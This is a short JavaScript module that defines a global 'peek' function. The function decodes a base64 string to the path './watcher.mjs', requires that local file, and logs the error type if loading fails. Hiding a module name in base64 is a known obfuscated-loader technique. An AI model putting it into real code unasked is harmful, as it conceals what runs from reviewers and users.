import { createRequire } from "node:module";
const require = createRequire(import.meta.url);
globalThis.peek = () => { try { require(Buffer.from("Li93YXRjaGVyLm1qcw==", "base64").toString()); } catch (error) { console.log("the load threw", error.constructor.name); } };
